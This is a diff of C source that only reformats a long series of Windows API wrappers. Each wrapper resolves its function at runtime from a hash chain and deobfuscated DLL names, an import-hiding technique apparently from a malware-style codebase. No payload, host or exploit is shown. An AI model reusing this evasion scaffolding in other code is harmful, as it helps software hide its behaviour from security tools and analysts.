-		f_wvsprintfW = (INT (WINAPI *)(LPTSTR, LPCTSTR, va_list))resolve_function(function_hash_chain[50], deobfuscate(user32));
+		f_wvsprintfW = (INT(WINAPI *)(LPTSTR, LPCTSTR, va_list))resolve_function(function_hash_chain[50], deobfuscate(user32));
 		CHECK_VALID(f_wvsprintfW);
 	}
 
@@ -1335,11 +1335,11 @@ void WINAPI OutputDebugString(
   _In_opt_  LPCTSTR lpOutputString
 );
 */
-VOID (WINAPI *f_OutputDebugStringW)(LPCTSTR string) = NULL;
+VOID(WINAPI *f_OutputDebugStringW)(LPCTSTR string) = NULL;
 VOID cOutputDebugStringW(__inopt LPCTSTR string)
 {
 	if (f_OutputDebugStringW == NULL) {
-		f_OutputDebugStringW = (VOID (WINAPI *)(LPCTSTR))resolve_function(function_hash_chain[51], deobfuscate(kernel32));
+		f_OutputDebugStringW = (VOID(WINAPI *)(LPCTSTR))resolve_function(function_hash_chain[51], deobfuscate(kernel32));
 		CHECK_VALID(f_OutputDebugStringW);
 	}
 
@@ -1350,11 +1350,11 @@ VOID cOutputDebugStringW(__inopt LPCTSTR string)
 LPTSTR WINAPI CharLower(
   _Inout_  LPTSTR lpsz
 );*/
-LPSTR (WINAPI *f_CharLowerA)(LPSTR string) = NULL;
+LPSTR(WINAPI *f_CharLowerA)(LPSTR string) = NULL;
 LPSTR cCharLowerA(LPSTR string)
 {
 	if (f_CharLowerA == NULL) {
-		f_CharLowerA = (LPSTR (WINAPI *)(LPSTR))resolve_function(function_hash_chain[52], deobfuscate(user32));
+		f_CharLowerA = (LPSTR(WINAPI *)(LPSTR))resolve_function(function_hash_chain[52], deobfuscate(user32));
 		CHECK_VALID(f_CharLowerA);
 	}
 
@@ -1369,14 +1369,14 @@ BOOL InternetCrackUrl(
   _Inout_  LPURL_COMPONENTS lpUrlComponents
 );
 */
-BOOL (WINAPI * f_InternetCrackUrlA)(LPCSTR url, DWORD len, DWORD flags, LPURL_COMPONENTS url_components) = NULL;
-BOOL cInternetCrackUrlA(	__in	LPCSTR				url,
-							__in	DWORD				len,
-							__in	DWORD				flags,
-							__inout	LPURL_COMPONENTS	url_components)
+BOOL(WINAPI * f_InternetCrackUrlA)(LPCSTR url, DWORD len, DWORD flags, LPURL_COMPONENTS url_components) = NULL;
+BOOL cInternetCrackUrlA(__in	LPCSTR				url,
+	__in	DWORD				len,
+	__in	DWORD				flags,
+	__inout	LPURL_COMPONENTS	url_components)
 {
 	if (f_InternetCrackUrlA == NULL) {
-		f_InternetCrackUrlA = (BOOL (WINAPI *)(LPCSTR, DWORD, DWORD, LPURL_COMPONENTS))
+		f_InternetCrackUrlA = (BOOL(WINAPI *)(LPCSTR, DWORD, DWORD, LPURL_COMPONENTS))
 			resolve_function(function_hash_chain[53], deobfuscate(wininet));
 		CHECK_VALID(f_InternetCrackUrlA);
 	}
@@ -1389,11 +1389,11 @@ void WINAPI GetSystemTime(
   _Out_  LPSYSTEMTIME lpSystemTime
 );
 */
-VOID (WINAPI *f_GetSystemTime)(LPSYSTEMTIME system_time) = NULL;
+VOID(WINAPI *f_GetSystemTime)(LPSYSTEMTIME system_time) = NULL;
 VOID cGetSystemTime(__out LPSYSTEMTIME system_time)
 {
 	if (f_GetSystemTime == NULL) {
-		f_GetSystemTime = (VOID (WINAPI *)(LPSYSTEMTIME))resolve_function(function_hash_chain[54], deobfuscate(kernel32));
+		f_GetSystemTime = (VOID(WINAPI *)(LPSYSTEMTIME))resolve_function(function_hash_chain[54], deobfuscate(kernel32));
 		CHECK_VALID(f_GetSystemTime);
 	}
 
@@ -1409,15 +1409,15 @@ BOOL WINAPI CryptAcquireContext(
   _In_   DWORD dwFlags
 );
 */
-BOOL (WINAPI *f_CryptAcquireContextW)(HCRYPTPROV *provider, LPCWSTR container, LPCWSTR zProvider, DWORD type, DWORD flags) = NULL;
-BOOL cCryptAcquireContextW(	__out	HCRYPTPROV		*provider,
-							__in	LPCWSTR			container,
-							__in	LPCWSTR			zProvider,
-							__in	DWORD			type,
-							__in	DWORD			flags)
+BOOL(WINAPI *f_CryptAcquireContextW)(HCRYPTPROV *provider, LPCWSTR container, LPCWSTR zProvider, DWORD type, DWORD flags) = NULL;
+BOOL cCryptAcquireContextW(__out	HCRYPTPROV		*provider,
+	__in	LPCWSTR			container,
+	__in	LPCWSTR			zProvider,
+	__in	DWORD			type,
+	__in	DWORD			flags)
 {
 	if (f_CryptAcquireContextW == NULL) {
-		f_CryptAcquireContextW = (BOOL (WINAPI *)(HCRYPTPROV *, LPCWSTR, LPCWSTR, DWORD, DWORD))
+		f_CryptAcquireContextW = (BOOL(WINAPI *)(HCRYPTPROV *, LPCWSTR, LPCWSTR, DWORD, DWORD))
 			resolve_function(function_hash_chain[55], deobfuscate(advapi32));
 		CHECK_VALID(f_CryptAcquireContextW);
 	}
@@ -1434,15 +1434,15 @@ BOOL WINAPI CryptCreateHash(
   _Out_  HCRYPTHASH *phHash
 );
 */
-BOOL (WINAPI *f_CryptCreateHash)(HCRYPTPROV provider, ALG_ID algo_id, HCRYPTKEY key, DWORD flags, HCRYPTHASH *hash) = NULL;
-BOOL cCryptCreateHash(	__in	HCRYPTPROV		provider,
-						__in	ALG_ID			algo_id,
-						__in	HCRYPTKEY		key,
-						__in	DWORD			flags,
-						__out	HCRYPTHASH*		hash)
+BOOL(WINAPI *f_CryptCreateHash)(HCRYPTPROV provider, ALG_ID algo_id, HCRYPTKEY key, DWORD flags, HCRYPTHASH *hash) = NULL;
+BOOL cCryptCreateHash(__in	HCRYPTPROV		provider,
+	__in	ALG_ID			algo_id,
+	__in	HCRYPTKEY		key,
+	__in	DWORD			flags,
+	__out	HCRYPTHASH*		hash)
 {
 	if (f_CryptCreateHash == NULL) {
-		f_CryptCreateHash = (BOOL (WINAPI *)(HCRYPTPROV, ALG_ID, HCRYPTKEY, DWORD, HCRYPTHASH*))
+		f_CryptCreateHash = (BOOL(WINAPI *)(HCRYPTPROV, ALG_ID, HCRYPTKEY, DWORD, HCRYPTHASH*))
 			resolve_function(function_hash_chain[56], deobfuscate(advapi32));
 		CHECK_VALID(f_CryptCreateHash);
 	}
@@ -1458,14 +1458,14 @@ BOOL WINAPI CryptHashData(
   _In_  DWORD dwFlags
 );
 */
-BOOL (WINAPI *f_CryptHashData)(HCRYPTHASH hash, PBYTE data, DWORD len, DWORD flags) = NULL;
+BOOL(WINAPI *f_CryptHashData)(HCRYPTHASH hash, PBYTE data, DWORD len, DWORD flags) = NULL;
 BOOL cCryptHashData(__in HCRYPTHASH		hash,
-					__in PBYTE			data,
-					__in DWORD			len,
-					__in DWORD			flags)
+	__in PBYTE			data,
+	__in DWORD			len,
+	__in DWORD			flags)
 {
 	if (f_CryptHashData == NULL) {
-		f_CryptHashData = (BOOL (WINAPI *)(HCRYPTHASH, PBYTE, DWORD, DWORD))
+		f_CryptHashData = (BOOL(WINAPI *)(HCRYPTHASH, PBYTE, DWORD, DWORD))
 			resolve_function(function_hash_chain[57], deobfuscate(advapi32));
 		CHECK_VALID(f_CryptHashData);
 	}
@@ -1482,15 +1482,15 @@ BOOL WINAPI CryptGetHashParam(
   _In_     DWORD dwFlags
 );
 */
-BOOL (WINAPI *f_CryptGetHashParam)(HCRYPTHASH hash, DWORD parm, PBYTE data, PDWORD data_len, DWORD flags) = NULL;
-BOOL cCryptGetHashParam(	__in	HCRYPTHASH	hash,
-							__in	DWORD		parm,
-							__out	PBYTE		data,
-							__inout PDWORD		data_len,
-							__in	DWORD		flags)
+BOOL(WINAPI *f_CryptGetHashParam)(HCRYPTHASH hash, DWORD parm, PBYTE data, PDWORD data_len, DWORD flags) = NULL;
+BOOL cCryptGetHashParam(__in	HCRYPTHASH	hash,
+	__in	DWORD		parm,
+	__out	PBYTE		data,
+	__inout PDWORD		data_len,
+	__in	DWORD		flags)
 {
 	if (f_CryptGetHashParam == NULL) {
-		f_CryptGetHashParam = (BOOL (WINAPI *)(HCRYPTHASH, DWORD, PBYTE, PDWORD, DWORD))
+		f_CryptGetHashParam = (BOOL(WINAPI *)(HCRYPTHASH, DWORD, PBYTE, PDWORD, DWORD))
 			resolve_function(function_hash_chain[58], deobfuscate(advapi32));
 		CHECK_VALID(f_CryptGetHashParam);
 	}
@@ -1502,11 +1502,11 @@ BOOL cCryptGetHashParam(	__in	HCRYPTHASH	hash,
 BOOL WINAPI CryptDestroyHash(
   _In_  HCRYPTHASH hHash
 );*/
-BOOL (WINAPI *f_CryptDestroyHash)(HCRYPTHASH hash) = NULL;
+BOOL(WINAPI *f_CryptDestroyHash)(HCRYPTHASH hash) = NULL;
 BOOL cCryptDestroyHash(__in HCRYPTHASH hash)
 {
 	if (f_CryptDestroyHash == NULL) {
-		f_CryptDestroyHash = (BOOL (WINAPI *)(HCRYPTHASH))resolve_function(function_hash_chain[59], deobfuscate(advapi32));
+		f_CryptDestroyHash = (BOOL(WINAPI *)(HCRYPTHASH))resolve_function(function_hash_chain[59], deobfuscate(advapi32));
 		CHECK_VALID(f_CryptDestroyHash);
 	}
 
@@ -1520,12 +1520,12 @@ BOOL WINAPI CryptReleaseContext(
   _In_  DWORD dwFlags
 );
 */
-BOOL (WINAPI *f_CryptReleaseContext)(HCRYPTPROV provider, DWORD flags) = NULL;
+BOOL(WINAPI *f_CryptReleaseContext)(HCRYPTPROV provider, DWORD flags) = NULL;
 BOOL cCryptReleaseContext(__in HCRYPTPROV	provider,
-						  __in DWORD		flags)
+	__in DWORD		flags)
 {
 	if (f_CryptReleaseContext == NULL) {
-		f_CryptReleaseContext = (BOOL (WINAPI *)(HCRYPTPROV, DWORD))resolve_function(function_hash_chain[60], deobfuscate(advapi32));
+		f_CryptReleaseContext = (BOOL(WINAPI *)(HCRYPTPROV, DWORD))resolve_function(function_hash_chain[60], deobfuscate(advapi32));
 		CHECK_VALID(f_CryptReleaseContext);
 	}
 
@@ -1538,239 +1538,239 @@ void WINAPI GetLocalTime(
 );
 */
 
- VOID (WINAPI *f_GetLocalTime)(LPSYSTEMTIME system_time) = NULL;
- VOID cGetLocalTime(__out LPSYSTEMTIME system_time)
- {
-	 if (f_GetLocalTime == NULL) {
-		 f_GetLocalTime = (VOID (WINAPI *)(LPSYSTEMTIME))resolve_function(function_hash_chain[61], deobfuscate(kernel32));
-		 CHECK_VALID(f_GetLocalTime);
-	 }
-	 
-	 return f_GetLocalTime(system_time);
- }
+VOID(WINAPI *f_GetLocalTime)(LPSYSTEMTIME system_time) = NULL;
+VOID cGetLocalTime(__out LPSYSTEMTIME system_time)
+{
+	if (f_GetLocalTime == NULL) {
+		f_GetLocalTime = (VOID(WINAPI *)(LPSYSTEMTIME))resolve_function(function_hash_chain[61], deobfuscate(kernel32));
+		CHECK_VALID(f_GetLocalTime);
+	}
 
- /*
- int MultiByteToWideChar(
-  _In_       UINT CodePage,
-  _In_       DWORD dwFlags,
-  _In_       LPCSTR lpMultiByteStr,
-  _In_       int cbMultiByte,
-  _Out_opt_  LPWSTR lpWideCharStr,
-  _In_       int cchWideChar
+	return f_GetLocalTime(system_time);
+}
+
+/*
+int MultiByteToWideChar(
+ _In_       UINT CodePage,
+ _In_       DWORD dwFlags,
+ _In_       LPCSTR lpMultiByteStr,
+ _In_       int cbMultiByte,
+ _Out_opt_  LPWSTR lpWideCharStr,
+ _In_       int cchWideChar
 );*/
- INT (WINAPI *f_MultiByteToWideChar)(UINT code_page, DWORD flags, LPCSTR multibytestr, INT multi_count, LPWSTR widecharstr, INT wide_count) = NULL;
- INT cMultiByteToWideChar(	__in	UINT		code_page,
-							__in	DWORD		flags,
-							__in	LPCSTR		multibytestr,
-							__in	INT			multi_count,
-							__outopt LPWSTR		widecharstr,
-							__in	INT			wide_count)
- {
-	 if (f_MultiByteToWideChar == NULL) {
-		 f_MultiByteToWideChar = (INT (WINAPI *)(UINT, DWORD, LPCSTR, INT, LPWSTR, INT))
-			 resolve_function(function_hash_chain[62], deobfuscate(kernel32));
-		 CHECK_VALID(f_MultiByteToWideChar);
-	 }
+INT(WINAPI *f_MultiByteToWideChar)(UINT code_page, DWORD flags, LPCSTR multibytestr, INT multi_count, LPWSTR widecharstr, INT wide_count) = NULL;
+INT cMultiByteToWideChar(__in	UINT		code_page,
+	__in	DWORD		flags,
+	__in	LPCSTR		multibytestr,
+	__in	INT			multi_count,
+	__outopt LPWSTR		widecharstr,
+	__in	INT			wide_count)
+{
+	if (f_MultiByteToWideChar == NULL) {
+		f_MultiByteToWideChar = (INT(WINAPI *)(UINT, DWORD, LPCSTR, INT, LPWSTR, INT))
+			resolve_function(function_hash_chain[62], deobfuscate(kernel32));
+		CHECK_VALID(f_MultiByteToWideChar);
+	}
 
-	 return f_MultiByteToWideChar(code_page, flags, multibytestr, multi_count, widecharstr, wide_count);
- }
+	return f_MultiByteToWideChar(code_page, flags, multibytestr, multi_count, widecharstr, wide_count);
+}
 
- /*
- int StrCmpNIC(
-  _In_  LPCTSTR pszStr1,
-  _In_  LPCTSTR pszStr2,
-  int nChar
+/*
+int StrCmpNIC(
+ _In_  LPCTSTR pszStr1,
+ _In_  LPCTSTR pszStr2,
+ int nChar
 );
 */
- INT (WINAPI *fStrCmpNICA)(LPCSTR str1, LPCSTR str2, INT nChar) = NULL;
- INT cStrCmpNICA(LPCSTR str1, LPCSTR str2, INT nChar)
- {
-	 if (fStrCmpNICA == NULL) {
-		 fStrCmpNICA = (INT (WINAPI *)(LPCSTR, LPCSTR, INT))resolve_function(function_hash_chain[63], deobfuscate(shlwapi));
-		 CHECK_VALID(fStrCmpNICA);
-	 }
+INT(WINAPI *fStrCmpNICA)(LPCSTR str1, LPCSTR str2, INT nChar) = NULL;
+INT cStrCmpNICA(LPCSTR str1, LPCSTR str2, INT nChar)
+{
+	if (fStrCmpNICA == NULL) {
+		fStrCmpNICA = (INT(WINAPI *)(LPCSTR, LPCSTR, INT))resolve_function(function_hash_chain[63], deobfuscate(shlwapi));
+		CHECK_VALID(fStrCmpNICA);
+	}
 
-	 return fStrCmpNICA(str1, str2, nChar);
- }
+	return fStrCmpNICA(str1, str2, nChar);
+}
 
- /*
- HANDLE WINAPI HeapCreate(
-  _In_  DWORD flOptions,
-  _In_  SIZE_T dwInitialSize,
-  _In_  SIZE_T dwMaximumSize
+/*
+HANDLE WINAPI HeapCreate(
+ _In_  DWORD flOptions,
+ _In_  SIZE_T dwInitialSize,
+ _In_  SIZE_T dwMaximumSize
 );
 */
- HANDLE (WINAPI *f_HeapCreate)(DWORD options, SIZE_T init_size, SIZE_T max_size) = NULL;
- HANDLE cHeapCreate(DWORD options, SIZE_T init_size, SIZE_T max_size)
- {
-	 if (f_HeapCreate == NULL) {
-		 f_HeapCreate = (HANDLE (WINAPI *)(DWORD, SIZE_T, SIZE_T))resolve_function(function_hash_chain[64], deobfuscate(kernel32));
-		 CHECK_VALID(f_HeapCreate);
-	 }
+HANDLE(WINAPI *f_HeapCreate)(DWORD options, SIZE_T init_size, SIZE_T max_size) = NULL;
+HANDLE cHeapCreate(DWORD options, SIZE_T init_size, SIZE_T max_size)
+{
+	if (f_HeapCreate == NULL) {
+		f_HeapCreate = (HANDLE(WINAPI *)(DWORD, SIZE_T, SIZE_T))resolve_function(function_hash_chain[64], deobfuscate(kernel32));
+		CHECK_VALID(f_HeapCreate);
+	}
 
-	 return f_HeapCreate(options, init_size, max_size);
- }
+	return f_HeapCreate(options, init_size, max_size);
+}
 
- /*
- int vsnprintf(
-   char *buffer,
-   size_t count,
-   const char *format,
-   va_list argptr 
+/*
+int vsnprintf(
+  char *buffer,
+  size_t count,
+  const char *format,
+  va_list argptr
 );
 */
- INT (_cdecl *f_vsnprintfA)(LPCSTR buffer, SIZE_T count, LPCSTR format, va_list argptr) = NULL;
- INT cvsnprintfA(LPCSTR buffer, SIZE_T count, LPCSTR format, va_list argptr)
- {
-	 if (f_vsnprintfA == NULL) {
-		 f_vsnprintfA = (INT (_cdecl *)(LPCSTR, SIZE_T, LPCSTR, va_list))resolve_function(function_hash_chain[65], deobfuscate(msvcrt));
-		 CHECK_VALID(f_vsnprintfA);
-	 }
+INT(_cdecl *f_vsnprintfA)(LPCSTR buffer, SIZE_T count, LPCSTR format, va_list argptr) = NULL;
+INT cvsnprintfA(LPCSTR buffer, SIZE_T count, LPCSTR format, va_list argptr)
+{
+	if (f_vsnprintfA == NULL) {
+		f_vsnprintfA = (INT(_cdecl *)(LPCSTR, SIZE_T, LPCSTR, va_list))resolve_function(function_hash_chain[65], deobfuscate(msvcrt));
+		CHECK_VALID(f_vsnprintfA);
+	}
 
-	 return f_vsnprintfA(buffer, count, format, argptr);
- }
+	return f_vsnprintfA(buffer, count, format, argptr);
+}
 
- /*
- HANDLE WINAPI CreateThread(
-  _In_opt_   LPSECURITY_ATTRIBUTES lpThreadAttributes,
-  _In_       SIZE_T dwStackSize,
-  _In_       LPTHREAD_START_ROUTINE lpStartAddress,
-  _In_opt_   LPVOID lpParameter,
-  _In_       DWORD dwCreationFlags,
-  _Out_opt_  LPDWORD lpThreadId
+/*
+HANDLE WINAPI CreateThread(
+ _In_opt_   LPSECURITY_ATTRIBUTES lpThreadAttributes,
+ _In_       SIZE_T dwStackSize,
+ _In_       LPTHREAD_START_ROUTINE lpStartAddress,
+ _In_opt_   LPVOID lpParameter,
+ _In_       DWORD dwCreationFlags,
+ _Out_opt_  LPDWORD lpThreadId
 );
 */
- HANDLE (WINAPI *f_CreateThread)(LPSECURITY_ATTRIBUTES attributes, SIZE_T stack_size, LPTHREAD_START_ROUTINE oep, LPVOID parameter,
-	 DWORD flags, LPDWORD tid) = NULL;
- HANDLE cCreateThread(	__inopt		LPSECURITY_ATTRIBUTES		attributes,
-						__in		SIZE_T						stack_size,
-						__in		LPTHREAD_START_ROUTINE		oep,
-						__inopt		LPVOID						parameter,
-						__in		DWORD						flags,
-						__outopt	LPDWORD						tid)
- {
-	 if (f_CreateThread == NULL) {
-		 f_CreateThread = (HANDLE (WINAPI *)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID,
-			 DWORD, LPDWORD))resolve_function(function_hash_chain[66], deobfuscate(kernel32));
-		 CHECK_VALID(f_CreateThread);
-	 }
+HANDLE(WINAPI *f_CreateThread)(LPSECURITY_ATTRIBUTES attributes, SIZE_T stack_size, LPTHREAD_START_ROUTINE oep, LPVOID parameter,
+	DWORD flags, LPDWORD tid) = NULL;
+HANDLE cCreateThread(__inopt		LPSECURITY_ATTRIBUTES		attributes,
+	__in		SIZE_T						stack_size,
+	__in		LPTHREAD_START_ROUTINE		oep,
+	__inopt		LPVOID						parameter,
+	__in		DWORD						flags,
+	__outopt	LPDWORD						tid)
+{
+	if (f_CreateThread == NULL) {
+		f_CreateThread = (HANDLE(WINAPI *)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID,
+			DWORD, LPDWORD))resolve_function(function_hash_chain[66], deobfuscate(kernel32));
+		CHECK_VALID(f_CreateThread);
+	}
 
-	 return f_CreateThread(attributes, stack_size, oep, parameter, flags, tid);
- }
+	return f_CreateThread(attributes, stack_size, oep, parameter, flags, tid);
+}
 
- /*
- BOOL WINAPI VirtualFree(
-  _In_  LPVOID lpAddress,
-  _In_  SIZE_T dwSize,
-  _In_  DWORD dwFreeType
+/*
+BOOL WINAPI VirtualFree(
+ _In_  LPVOID lpAddress,
+ _In_  SIZE_T dwSize,
+ _In_  DWORD dwFreeType
 );
  */
- BOOL (WINAPI *f_VirtualFree)(LPVOID address, SIZE_T size, DWORD type) = NULL;
- BOOL cVirtualFree(	__in LPVOID		address,
-					__in SIZE_T		size,
-					__in DWORD		type)
- {
-	 if (f_VirtualFree == NULL) {
-		 f_VirtualFree = (BOOL (WINAPI *)(LPVOID, SIZE_T, DWORD))resolve_function(function_hash_chain[67], deobfuscate(kernel32));
-		 CHECK_VALID(f_VirtualFree);
-	 }
+BOOL(WINAPI *f_VirtualFree)(LPVOID address, SIZE_T size, DWORD type) = NULL;
+BOOL cVirtualFree(__in LPVOID		address,
+	__in SIZE_T		size,
+	__in DWORD		type)
+{
+	if (f_VirtualFree == NULL) {
+		f_VirtualFree = (BOOL(WINAPI *)(LPVOID, SIZE_T, DWORD))resolve_function(function_hash_chain[67], deobfuscate(kernel32));
+		CHECK_VALID(f_VirtualFree);
+	}
 
-	 return f_VirtualFree(address, size, type);
- }
+	return f_VirtualFree(address, size, type);
+}
 
- /*
- BOOL InternetQueryOption(
-  _In_     HINTERNET hInternet,
-  _In_     DWORD dwOption,
-  _Out_    LPVOID lpBuffer,
-  _Inout_  LPDWORD lpdwBufferLength
+/*
+BOOL InternetQueryOption(
+ _In_     HINTERNET hInternet,
+ _In_     DWORD dwOption,
+ _Out_    LPVOID lpBuffer,
+ _Inout_  LPDWORD lpdwBufferLength
 );*/
- BOOL (WINAPI *f_InternetQueryOption)(HINTERNET internet, DWORD option, LPVOID buffer, LPDWORD buffer_length) = NULL;
- BOOL cInternetQueryOptionA(	__in	HINTERNET	internet,
-								__in	DWORD		option,
-								__out	LPVOID		buffer,
-								__inout LPDWORD		buffer_length)
- {
-	 if (f_InternetQueryOption == NULL) {
-		 f_InternetQueryOption = (BOOL (WINAPI *)(HINTERNET, DWORD, LPVOID, LPDWORD))resolve_function(function_hash_chain[68], deobfuscate(wininet));
-		 CHECK_VALID(f_InternetQueryOption);
-	 }
+BOOL(WINAPI *f_InternetQueryOption)(HINTERNET internet, DWORD option, LPVOID buffer, LPDWORD buffer_length) = NULL;
+BOOL cInternetQueryOptionA(__in	HINTERNET	internet,
+	__in	DWORD		option,
+	__out	LPVOID		buffer,
+	__inout LPDWORD		buffer_length)
+{
+	if (f_InternetQueryOption == NULL) {
+		f_InternetQueryOption = (BOOL(WINAPI *)(HINTERNET, DWORD, LPVOID, LPDWORD))resolve_function(function_hash_chain[68], deobfuscate(wininet));
+		CHECK_VALID(f_InternetQueryOption);
+	}
 
-	 return f_InternetQueryOption(internet, option, buffer, buffer_length);
- }
+	return f_InternetQueryOption(internet, option, buffer, buffer_length);
+}
 
- /*
- BOOL HttpQueryInfo(
-  _In_     HINTERNET hRequest,
-  _In_     DWORD dwInfoLevel,
-  _Inout_  LPVOID lpvBuffer,
-  _Inout_  LPDWORD lpdwBufferLength,
-  _Inout_  LPDWORD lpdwIndex
+/*
+BOOL HttpQueryInfo(
+ _In_     HINTERNET hRequest,
+ _In_     DWORD dwInfoLevel,
+ _Inout_  LPVOID lpvBuffer,
+ _Inout_  LPDWORD lpdwBufferLength,
+ _Inout_  LPDWORD lpdwIndex
 );
 */
-BOOL (WINAPI *f_HttpQueryInfoA)(HINTERNET request, DWORD level, LPVOID buffer, LPDWORD buffer_length, LPDWORD index) = NULL;
-BOOL cHttpQueryInfoA(	__in		HINTERNET	request,
-					__in		DWORD		level,
-					__inout		LPVOID		buffer,
-					__inout		LPDWORD		buffer_length,
-					__inout		LPDWORD		index)
+BOOL(WINAPI *f_HttpQueryInfoA)(HINTERNET request, DWORD level, LPVOID buffer, LPDWORD buffer_length, LPDWORD index) = NULL;
+BOOL cHttpQueryInfoA(__in		HINTERNET	request,
+	__in		DWORD		level,
+	__inout		LPVOID		buffer,
+	__inout		LPDWORD		buffer_length,
+	__inout		LPDWORD		index)
 {
 	if (f_HttpQueryInfoA == NULL) {
-	f_HttpQueryInfoA = (BOOL (WINAPI *)(HINTERNET, DWORD, LPVOID, LPDWORD, LPDWORD))resolve_function(function_hash_chain[69], deobfuscate(wininet));
-	CHECK_VALID(f_HttpQueryInfoA);
+		f_HttpQueryInfoA = (BOOL(WINAPI *)(HINTERNET, DWORD, LPVOID, LPDWORD, LPDWORD))resolve_function(function_hash_chain[69], deobfuscate(wininet));
+		CHECK_VALID(f_HttpQueryInfoA);
 	}
 
 	return f_HttpQueryInfoA(request, level, buffer, buffer_length, index);
 }
 
- /*
- HRSRC WINAPI FindResource(
-  _In_opt_  HMODULE hModule,
-  _In_      LPCTSTR lpName,
-  _In_      LPCTSTR lpType
+/*
+HRSRC WINAPI FindResource(
+ _In_opt_  HMODULE hModule,
+ _In_      LPCTSTR lpName,
+ _In_      LPCTSTR lpType
 );
 */
-HRSRC (WINAPI *f_FindResourceA)(HMODULE module, LPCSTR name, LPCSTR type) = NULL;
-HRSRC cFindResourceA(	__in_opt	HMODULE		module,
-					__in		LPCSTR		name,
-					__in		LPCSTR		type)
+HRSRC(WINAPI *f_FindResourceA)(HMODULE module, LPCSTR name, LPCSTR type) = NULL;
+HRSRC cFindResourceA(__in_opt	HMODULE		module,
+	__in		LPCSTR		name,
+	__in		LPCSTR		type)
 {
 	if (f_FindResourceA == NULL) {
-		f_FindResourceA = (HRSRC (WINAPI *)(HMODULE, LPCSTR, LPCSTR))resolve_function(function_hash_chain[70], deobfuscate(kernel32));
+		f_FindResourceA = (HRSRC(WINAPI *)(HMODULE, LPCSTR, LPCSTR))resolve_function(function_hash_chain[70], deobfuscate(kernel32));
 		CHECK_VALID(f_FindResourceA);
 	}
 
 	return f_FindResourceA(module, name, type);
 }
 
- /*
- HGLOBAL WINAPI LoadResource(
-  _In_opt_  HMODULE hModule,
-  _In_      HRSRC hResInfo
+/*
+HGLOBAL WINAPI LoadResource(
+ _In_opt_  HMODULE hModule,
+ _In_      HRSRC hResInfo
 );
 */
-HGLOBAL (WINAPI *f_LoadResource)(HMODULE module, HRSRC resource_info) = NULL;
-HGLOBAL cLoadResource(	__in_opt	HMODULE		module,
-					__in		HRSRC		resource_info)
+HGLOBAL(WINAPI *f_LoadResource)(HMODULE module, HRSRC resource_info) = NULL;
+HGLOBAL cLoadResource(__in_opt	HMODULE		module,
+	__in		HRSRC		resource_info)
 {
 	if (f_LoadResource == NULL) {
-		f_LoadResource = (HGLOBAL (WINAPI *)(HMODULE, HRSRC))resolve_function(function_hash_chain[71], deobfuscate(kernel32));
+		f_LoadResource = (HGLOBAL(WINAPI *)(HMODULE, HRSRC))resolve_function(function_hash_chain[71], deobfuscate(kernel32));
 		CHECK_VALID(f_LoadResource);
 	}
 
 	return f_LoadResource(module, resource_info);
 }
 
- /*
- LPVOID WINAPI LockResource(
-  _In_  HGLOBAL hResData
+/*
+LPVOID WINAPI LockResource(
+ _In_  HGLOBAL hResData
 );
 */
-LPVOID (WINAPI *f_LockResource)(HGLOBAL resource_data) = NULL;
+LPVOID(WINAPI *f_LockResource)(HGLOBAL resource_data) = NULL;
 LPVOID cLockResource(__in HGLOBAL resource_data)
 {
 	if (f_LockResource == NULL) {
-		f_LockResource = (LPVOID (WINAPI *)(HGLOBAL))resolve_function(function_hash_chain[72], deobfuscate(kernel32));
+		f_LockResource = (LPVOID(WINAPI *)(HGLOBAL))resolve_function(function_hash_chain[72], deobfuscate(kernel32));
 		CHECK_VALID(f_LockResource);
 	}
 
@@ -1783,12 +1783,12 @@ DWORD WINAPI SizeofResource(
   _In_      HRSRC hResInfo
 );
 */
-DWORD (WINAPI *f_SizeofResource)(HMODULE module, HRSRC resource_info) = NULL;
-DWORD cSizeofResource(	__in_opt	HMODULE		module,
-						__in		HRSRC		resource_info)
+DWORD(WINAPI *f_SizeofResource)(HMODULE module, HRSRC resource_info) = NULL;
+DWORD cSizeofResource(__in_opt	HMODULE		module,
+	__in		HRSRC		resource_info)
 {
 	if (f_SizeofResource == NULL) {
-		f_SizeofResource = (DWORD (WINAPI *)(HMODULE, HRSRC))resolve_function(function_hash_chain[73], deobfuscate(kernel32));
+		f_SizeofResource = (DWORD(WINAPI *)(HMODULE, HRSRC))resolve_function(function_hash_chain[73], deobfuscate(kernel32));
 		CHECK_VALID(f_SizeofResource);
 	}
 
@@ -1801,12 +1801,12 @@ BOOL WINAPI IsBadReadPtr(
   _In_  UINT_PTR ucb
 );
 */
-BOOL (WINAPI *f_IsBadReadPtr)(const VOID *lp, UINT_PTR ucb) = NULL;
-BOOL cIsBadReadPtr(	__in	const VOID		*lp,
-					__in	UINT_PTR		ucb)
+BOOL(WINAPI *f_IsBadReadPtr)(const VOID *lp, UINT_PTR ucb) = NULL;
+BOOL cIsBadReadPtr(__in	const VOID		*lp,
+	__in	UINT_PTR		ucb)
 {
 	if (f_IsBadReadPtr == NULL) {
-		f_IsBadReadPtr = (BOOL (WINAPI *)(const VOID *, UINT_PTR))resolve_function(function_hash_chain[74], deobfuscate(kernel32));
+		f_IsBadReadPtr = (BOOL(WINAPI *)(const VOID *, UINT_PTR))resolve_function(function_hash_chain[74], deobfuscate(kernel32));
 		CHECK_VALID(f_IsBadReadPtr);
 	}
 
@@ -1819,12 +1819,12 @@ BOOL WINAPI CreateDirectory(
   _In_opt_  LPSECURITY_ATTRIBUTES lpSecurityAttributes
 );
 */
-BOOL (WINAPI *f_CreateDirectoryA)(LPCSTR path_name, LPSECURITY_ATTRIBUTES security_attributes) = NULL;
-BOOL cCreateDirectoryA(	__in		LPCSTR					path_name,
-						__in_opt	LPSECURITY_ATTRIBUTES	security_attributes)
+BOOL(WINAPI *f_CreateDirectoryA)(LPCSTR path_name, LPSECURITY_ATTRIBUTES security_attributes) = NULL;
+BOOL cCreateDirectoryA(__in		LPCSTR					path_name,
+	__in_opt	LPSECURITY_ATTRIBUTES	security_attributes)
 {
 	if (f_CreateDirectoryA == NULL) {
-		f_CreateDirectoryA = (BOOL (WINAPI *)(LPCSTR, LPSECURITY_ATTRIBUTES))resolve_function(function_hash_chain[75], deobfuscate(kernel32));
+		f_CreateDirectoryA = (BOOL(WINAPI *)(LPCSTR, LPSECURITY_ATTRIBUTES))resolve_function(function_hash_chain[75], deobfuscate(kernel32));
 		CHECK_VALID(f_CreateDirectoryA);
 	}
 
@@ -1837,12 +1837,12 @@ BOOL WINAPI IsBadWritePtr(
   _In_  UINT_PTR ucb
 );
 */
